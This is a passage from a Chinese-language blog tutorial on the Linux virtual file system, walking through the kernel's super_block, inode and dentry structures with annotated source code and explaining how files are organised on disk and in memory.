class="title">s_io</span>;</span><span class="comment">/* parked for writeback */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span><span class="title">s_anon</span>;</span><span class="comment">/* anonymous dentries for (nfs) exporting */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_files</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>*<span class="title">s_bdev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mtd_info</span>*<span class="title">s_mtd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_instances</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">quota_info</span><span class="title">s_dquot</span>;</span><span class="comment">/* Diskquota specific options */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span>s_frozen;</span><br><span class="line"><span class="type">wait_queue_head_t</span>s_wait_unfrozen;</span><br><span class="line"><span class="type">char</span> s_id[<span class="number">32</span>];<span class="comment">/* Informational name */</span></span><br><span class="line"><span class="type">void</span> *s_fs_info;<span class="comment">/* Filesystem private info */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The next field is for VFS *only*. No filesystems have any business</span></span><br><span class="line"><span class="comment"> * even looking at it. You had been warned.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">s_vfs_rename_mutex</span>;</span><span class="comment">/* Kludge */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Granularity of c/m/atime in ns.</span></span><br><span class="line"><span class="comment">   Cannot be worse than a second */</span></span><br><span class="line">u32   s_time_gran;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Filesystem subtype.  If non-empty the filesystem type field</span></span><br><span class="line"><span class="comment"> * in /proc/mounts will be &quot;type.subtype&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> *s_subtype;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​以上代码在注释中有对每一项的解释，下面列出几个比较重要的成员单独提一下：</p><ul><li><code>struct list_heads_list;</code>：双向循环链表，前后指针连接所有超级块的链表，其结构体实现为 <code>struct list_head *next, *prev;</code>。</li><li><code>unsigned chars_dirt;</code>：修改（脏页）标记。</li><li><code>struct file_system_type   *s_type;</code>：文件系统类型结构体（比如是 EXT2 还是 FAT32），里边是对文件系统的细节描述，后面有介绍。</li><li><code>const struct super_operations *s_op;</code>：超级块方法结构体，定义了超级块操作函数指针的集合，例如有 <code>(* destroy_inode) </code>，<code>(* write_inode)</code> ，<code>(* free_inode)</code> 等等。</li><li><code>struct dentry  *s_root;</code>：超级块内的指向根目录的 dentry 结构体指针。（dentry 结构体简单来说就是形成 Linux 文件树形结构的节点，我们在后面再进一步详解。）</li><li><code>struct list_heads_inodes;</code>：指向 inode 节点链表，该结构体马上会介绍到。</li><li><code>struct list_heads_dirty;</code>：指向脏的 inode 节点链表，因此当要回写所有脏 inode 到磁盘时便无需遍历所有的 inode 节点。</li></ul><p>​超级块通过 alloc_super() 函数创建并初始化，在文件系统安装时，文件系统会调用该函数以便于从磁盘中读取文件系统超级块，并且将信息填充到内存中的超级块对象中。</p><h2 id="索引节点（index-node，inode）"><a href="#索引节点（index-node，inode）" class="headerlink" title="索引节点（index node，inode）"></a>索引节点（index node，inode）</h2><p>​Unix&#x2F;Linux 操作系统将一个文件实际上分成两部分，一部分是文件数据本身，另一部分是文件的控制信息，例如文件大小，设备标识符文件模式，扩展属性等等，这些信息又被称为文件的元数据，它们由 <code>struct inode</code>所表示，在 Linux 中可用<code>stat file</code>查看其 inode 信息。比如我们使用<code>ls -l</code>命令查看的就是文件的一些元数据而非文件本身。同时注意：inode 有两种，一种是 VFS 的 inode，一种是具体文件系统的 inode 。前者在内存中，后者在磁盘中。所以每次其实是将磁盘中的 inode 调进填充内存中的 inode，这样才是算使用了磁盘文件 inode，而对 VFS 索引节点的任何修改都将写回磁盘更新磁盘的索引节点 。此外，由于文件系统种类繁多，某些文件系统可能并不能完整地包含索引节点结构体所要求的所有信息，例如，有的文件系统可能并不记录文件的访问时间，这时该文件系统可以在实现中选择合适的办法来解决这个问题。</p><p>​每个文件都有全系统唯一的 inode 编号，用于 Linux 内部区分不同文件，在通过文件名读文件时，首先系统找到该文件名对应的 inode 号；其次通过 inode 号获取 inode 信息；最后根据 inode 信息找到文件数据所在的 block并读出数据。</p><blockquote><p>正因此也使得软件更新变得简单，可以在不关闭软件的情况下进行更新，不需要重启。因为系统通过 inode 号识别运行中的文件而非文件名。更新时新版文件以同样的文件名生成一个新的 inode ，不会影响到正在运行中的文件。等到下一次运行该软件的时，文件名就自动指向新版文件了，而旧版文件的 inode 则已被回收。</p></blockquote><p>​inode 结构体数据结构相对稳定，没有变长数据，可以固定其大小，进而可以实现将整个文件系统中的 inode 按照一定的组织方式（数组）来集中存储在硬盘某位置，文件系统加载时很方便查找，一般每个inode节点的大小是128字节或256字节。最后提一点，inode 包含一个文件的所有描述信息，除了文件名，至于为什么我们后面再提。下面来看一看 inode 的源码，定义于<code>linux/fs.h</code>里。</p><blockquote><p>由于每个文件都必须有一个inode，因此有可能发生inode已经用光，但是硬盘还未存满的情况。这时，就无法在硬盘上创建新文件。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="type">umode_t</span>         i_mode;<span class="comment">//文件的访问权限（eg:rwxrwxrwx）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>      i_opflags;</span><br><span class="line">    <span class="type">kuid_t</span>          i_uid;<span class="comment">//inode拥有者id</span></span><br><span class="line">    <span class="type">kgid_t</span>          i_gid;<span class="comment">//inode拥有者组id</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_flags;<span class="comment">//inode标志，可以是S_SYNC,S_NOATIME,S_DIRSYNC等</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FS_POSIX_ACL</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">posix_acl</span>    *<span class="title">i_acl</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">posix_acl</span>    *<span class="title">i_default_acl</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span>   *<span class="title">i_op</span>;</span><span class="comment">//inode操作</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span>  *<span class="title">i_sb</span>;</span><span class="comment">//所属的超级块</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        address_space并不代表某个地址空间，而是用于描述页高速缓存中的页面的一个文件对应一个address_space，一个address_space与一个偏移量能够确定一个一个也高速缓存中的页面。i_mapping通常指向i_data,不过两者是有区别的，i_mapping表示应该向谁请求页面，i_data表示被改inode读写的页面。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">i_mapping</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>            *i_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Stat data, not accessed from path walking */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       i_ino;<span class="comment">//inode号</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Filesystems may only read i_nlink directly.  They shall use the</span></span><br><span class="line"><span class="comment">     * following functions for modification:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *    (set|clear|inc|drop)_nlink</span></span><br><span class="line"><span class="comment">     *    inode_(inc|dec)_link_count</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> i_nlink;<span class="comment">//硬链接个数</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> __i_nlink;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">dev_t</span>           i_rdev;<span class="comment">//如果inode代表设备，i_rdev表示该设备的设备号</span></span><br><span class="line">    <span class="type">loff_t</span>          i_size;<span class="comment">//文件大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_atime</span>;</span><span class="comment">//最近一次访问文件的时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_mtime</span>;</span><span class="comment">//最近一次修改文件的时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_ctime</span>;</span><span class="comment">//最近一次修改inode的时间</span></span><br><span class="line">    <span class="type">spinlock_t</span>      i_lock; <span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>          i_bytes;<span class="comment">//文件中位于最后一个块的字节数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_blkbits;<span class="comment">//以bit为单位的块的大小</span></span><br><span class="line">    <span class="type">blkcnt_t</span>        i_blocks;<span class="comment">//文件使用块的数目</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __NEED_I_SIZE_ORDERED</span></span><br><span class="line">    <span class="type">seqcount_t</span>      i_size_seqcount;<span class="comment">//对i_size进行串行计数</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Misc */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       i_state;<span class="comment">//inode状态，可以是I_NEW,I_LOCK,I_FREEING等</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>        <span class="title">i_mutex</span>;</span><span class="comment">//保护inode的互斥锁</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//inode第一次为脏的时间 以jiffies为单位</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       dirtied_when;   <span class="comment">/* jiffies of first dirtying */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>   <span class="title">i_hash</span>;</span><span class="comment">//散列表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_wb_list</span>;</span>  <span class="comment">/* backing dev IO list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_lru</span>;</span>      <span class="comment">/* inode LRU list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_sb_list</span>;</span><span class="comment">//超级块链表</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>   <span class="title">i_dentry</span>;</span><span class="comment">//所有引用该inode的目录项形成的链表</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">i_rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    u64         i_version;<span class="comment">//版本号 inode每次修改后递增</span></span><br><span class="line">    <span class="type">atomic_t</span>        i_count;<span class="comment">//引用计数</span></span><br><span class="line">    <span class="type">atomic_t</span>        i_dio_count;</span><br><span class="line">    <span class="type">atomic_t</span>        i_writecount;<span class="comment">//记录有多少个进程以可写的方式打开此文件</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">i_fop</span>;</span> <span class="comment">/* former -&gt;i_op-&gt;default_file_ops */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_lock</span>    *<span class="title">i_flock</span>;</span><span class="comment">//文件锁链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    <span class="title">i_data</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_QUOTA</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dquot</span>        *<span class="title">i_dquot</span>[<span class="title">MAXQUOTAS</span>];</span><span class="comment">//inode磁盘限额</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        公用同一个驱动的设备形成链表，比如字符设备，在open时，会根据i_rdev字段查找相应的驱动程序，并使i_cdev字段指向找到的cdev，然后inode添加到struct cdev中的list字段形成的链表中</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_devices</span>;</span>，</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>  *<span class="title">i_pipe</span>;</span><span class="comment">//如果文件是一个管道则使用i_pipe</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">i_bdev</span>;</span><span class="comment">//如果文件是一个块设备则使用i_bdev</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>     *<span class="title">i_cdev</span>;</span><span class="comment">//如果文件是一个字符设备这使用i_cdev</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    __u32           i_generation;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FSNOTIFY</span></span><br><span class="line">   <span class="comment">//目录通知事件掩码</span></span><br><span class="line">    __u32           i_fsnotify_mask; <span class="comment">/* all events this inode cares about */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>   <span class="title">i_fsnotify_marks</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_IMA</span></span><br><span class="line">    <span class="type">atomic_t</span>        i_readcount; <span class="comment">/* struct files open RO */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">//存储文件系统或者设备的私有信息</span></span><br><span class="line">    <span class="type">void</span>            *i_private; <span class="comment">/* fs or device private pointer */</span></span><br><span class="line">    <span class="comment">//存储各个特定的文件系统属性</span></span><br><span class="line">   <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">minix_inode_info</span> <span class="title">minix_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ext2_inode_info</span> <span class="title">ext2_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ext3_inode_info</span> <span class="title">ext3_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hpfs_inode_info</span> <span class="title">hpfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ntfs_inode_info</span> <span class="title">ntfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msdos_inode_info</span> <span class="title">msdos_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">umsdos_inode_info</span> <span class="title">umsdos_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iso_inode_info</span> <span class="title">isofs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysv_inode_info</span> <span class="title">sysv_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">affs_inode_info</span> <span class="title">affs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ufs_inode_info</span> <span class="title">ufs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">efs_inode_info</span> <span class="title">efs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">romfs_inode_info</span> <span class="title">romfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shmem_inode_info</span> <span class="title">shmem_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">coda_inode_info</span> <span class="title">coda_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">smb_inode_info</span> <span class="title">smbfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hfs_inode_info</span> <span class="title">hfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">adfs_inode_info</span> <span class="title">adfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qnx4_inode_info</span> <span class="title">qnx4_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reiserfs_inode_info</span> <span class="title">reiserfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bfs_inode_info</span> <span class="title">bfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">udf_inode_info</span> <span class="title">udf_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ncp_inode_info</span> <span class="title">ncpfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_inode_info</span> <span class="title">proc_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socketsocket_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">usbdev_inode_info</span> <span class="title">usbdev_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">jffs2_inode_infojffs2_i</span>;</span></span><br><span class="line">    <span class="type">void</span> *generic_ip;</span><br><span class="line">&#125; u;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​以上代码在注释中有对每一项的解释，下面列出几个比较重要的成员单独提一下：</p><ul><li><code>struct hlist_node   i_hash;</code>：哈希表，内部为 <code>struct hlist_node *next, **pprev;</code>。系统通过 VFS inode 链表来对其进行组织，为了提高访问效率相应地构造了 inode 构造缓存和 此hash table。</li><li><code>struct list_head    i_list, i_sb_list, i_dentry;</code>：分别是索引节点链表，超级块链表和目录项链表。</li><li><code> unsigned long       i_ino;</code>：用于唯一的标识的索引节点号。</li><li><code>atomic_t        i_count;</code>：引用计数。</li><li><code> unsignd inti_nlink</code>：硬链接数。（关于软硬链接的区别不了解的话可以搜搜）</li><li><code>umode_t         i_mode;</code>：文件访问权限（eg：rwxrwxrwx），掩码格式表示。</li><li><code>kuid_t          i_uid;</code>：inode 拥有者 id。</li><li><code>loff_t          i_size;</code>：文件大小。</li><li><code>dev_t           i_rdev;</code>：如果 inode 代表设备，i_rdev 表示该设备的设备号。</li><li><code>struct address_space    *i_mapping;</code>：该指针指向和物理页 page 相关的结构体。</li><li><code>struct timespec     i_atime, i_mtime, i_ctime;</code>：最后一次访问，修改文件，修改 inode 时间。</li><li><code>struct super_block  *i_sb;</code>：所属的超级块指针。</li><li><code>const struct inode_operations   *i_op;</code>：inode 函数操作结构体。描述了可以对 inode 进行的一系列操作，例如 ：<code>(*create)</code>，<code>(*mkdir)</code>，<code>(*symlink)</code>等等。</li></ul><p>​当文件被进程打开时，磁盘里的 inode 结构体也就会被相应地加载进内存里，从内存的角度来看，inode 只可能处于3种状态之一</p><ol><li>inode存于内存中，没有被任何进程引用，不处于活动使用状态，也没有被修改过。</li><li>inode存于内存中，正被一个或多个进程引用，即它的 i_count 和 i_nlink 都大于0，且文件内容和 inode 元数据内容都没被修改过。</li><li>inode处于内存中，内容或元数据被修改过，即 inode 是脏的。</li></ol><p>​内核提供了3个全局的链表来管理这3种状态的 inode，inode_unused 对应于第一种情况，inode_in_use 对应于第二种情况，超级块的 s_dirty 链表对应第三种情况。任何时刻内存中的 inode 只能在这3个链表之一，使用了 i_list 指针指向它所在的链表。维护这3个链表的好处是，当脏数据写回到磁盘时，只需要遍历超级块 super_block -&gt; s_dirty 上所有的 inode 就行。</p><p>​以上我们可以看作是内存中的 VFS inode 结构体，而对于硬盘中不同的具体文件系统其还有自己的实现域，比如 EXT2 文件系统在指向文件数据的具体实现为 12个直接块指针，一个一级间接块指针，一个二级间接块指针和一个三级块指针。通过 inode 节点指向各个目录块和数据块，便形成了文件系统在磁盘中的组织形式。例如，下图是 EXT2 的改进版本 EXT4 的组织方式 。</p><p><img src="https://s2.loli.net/2023/01/16/wHjQp7i4OGEsn1V.png" alt="Linux目录树.png"></p><p>​接下来我们来看两个简单的例子粗浅地描述了其执行流程：</p><blockquote><p><code>mkdir /home/bingbing/zhuzhu.c 执行过程</code>：（1）通过块位图区找到空闲的数据块，存放 zhuzhu.c 中的内容 （2）通过 inode 位图区找到空闲的 inode 节点块，生成相应的 inode 节点 （3）在 bingbing 目录文件的数据块中添加一条 zhuzhu.c 的记录项。</p><p><code>vim /home/bingbing/cat.c执行过程</code>：（1）找到 inode 编号为 2 的 inode 节点（Linux 根目录索引节点号）。（2）遍历根目录文件的数据块中的记录项，匹配 home记录项，获取其 inode 编号。 （3）遍历 home 目录文件的数据块中的记录项，匹配 bingbing 记录项，获取其 inode 编号。 （4）遍历 bingbing 目录文件的数据块中的记录项，匹配 cat.c 记录项，获取其 inode 编号，找到对应的的数据块，最后用 vim 打开文件。</p></blockquote><blockquote><p>在这里抛出两个问题尚未解决，第一：dentry 只存在于内存里，那 inode 节点在树里的位置，还有比如它的父结点，子结点这些是在哪里存的呢？第二：inode结构体哪个成员表示其指向的数据块或者目录块？</p></blockquote><h1 id="文件在内存中的组织形式"><a href="#文件在内存中的组织形式" class="headerlink" title="文件在内存中的组织形式"></a>文件在内存中的组织形式</h1><p>​文件在磁盘中以超级块 -&gt; inode -&gt; 数据块&#x2F;目录块的形式进行组织，而进程在操作文件时会将其加载到内存中，下面我们来看一看文件在内存中的组织形式。</p><h2 id="目录项-dentry"><a href="#目录项-dentry" class="headerlink" title="目录项(dentry)"></a>目录项(dentry)</h2><p>​前面我们提到了 inode 节点并不存储文件的名字，实际上 dentry 结构体便用来记录文件的名字、对应文件的 inode 指针，与其他 dentry 的关联关系。而多个相互关联的 dentry 目录项形成的树，就构成文件系统的目录结构，这便是文件系统的逻辑组织结构。因此我们可以总结出来，在 Linux 内存里的文件可以看成两部分，一部分是 dentry 结构体组成的目录树，每个 dentry 节点指向对应文件的 inode ，用于描述文件信息，而 inode 节点又指向文件的具体内容。</p><blockquote><p>例如：open一个文件 <code>/home/code1/test.c</code>，那么 &#x2F;、home、code1、test.c 都是一个 dentry节点（目录项），VFS 在查找的时候，根据一层一层的目录项找到对应的每个目录项的 inode ，那么沿着目录项进行操作就可以找到最终的文件。</p></blockquote><p><img src="https://s2.loli.net/2023/01/16/noakKG86AJFOqle.png" alt="image.png"></p><p>​与 inode 不同，dentry 是由内核维护的一个内存数据结构，所以通常也被叫做 dentry cache（目录项缓存），因此 dentry 只存在于内存中，并非像 inode 一样存储在磁盘中，VFS 根据字符串形式的路径名现场创建它。dentry 与 inode 是多对一的关系，即一个文件能够具有多个名称 —— 硬连接是最好的例子。下面我们来看一下 dentry 结构体的代码，其定义于<code>&lt;linux/dcache.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line"><span class="type">atomic_t</span> d_count;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> d_flags;<span class="comment">/* protected by d_lock */</span></span><br><span class="line"><span class="type">spinlock_t</span> d_lock;<span class="comment">/*自旋锁 per dentry lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span><span class="comment">/* Where the name belongs to - NULL is</span></span><br><span class="line"><span class="comment"> * negative */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The next three fields are touched by __d_lookup.  Place them here</span></span><br><span class="line"><span class="comment"> * so they all fit in a cache line.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_hash</span>;</span><span class="comment">/* lookup hash list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span><span class="comment">/* parent directory */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_lru</span>;</span><span class="comment">/* LRU list */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * d_child and d_rcu can share memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span><span class="comment">/* child of parent list */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">&#125; d_u;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span 